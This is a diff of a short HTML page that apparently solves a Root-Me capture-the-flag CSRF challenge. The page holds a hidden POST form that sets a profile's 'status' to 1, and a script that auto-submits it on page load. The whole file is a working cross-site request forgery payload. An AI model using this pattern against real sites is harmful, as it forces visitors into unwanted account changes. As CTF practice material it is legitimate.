@@ -2,20 +2,20 @@
 <html>
 <head>
     <title>CSRF Challenge</title>
-    <script>
-        function submitFormAutomatically() {
-            var form = document.getElementById("csrfForm");
-            if (form) {
-                form.submit();
-            }
-        }
-        window.onload = submitFormAutomatically;
-    </script>
 </head>
 <body>
-   <form id="csrfForm" action="http://challenge01.root-me.org/web-client/ch22/index.php?action=profile" method="POST">
+   <form name="csrfForm" action="http://challenge01.root-me.org/web-client/ch22/index.php?action=profile" method="POST">
        <input type="text" name="username" value="test" />
        <input type="text" name="status" value="1" />
    </form>
+   <script>
+       function submitFormAutomatically() {
+           var form = document.csrfForm;
+           if (form) {
+               form.submit();
+           }
+       }
+       submitFormAutomatically();
+   </script>
 </body>
 </html>
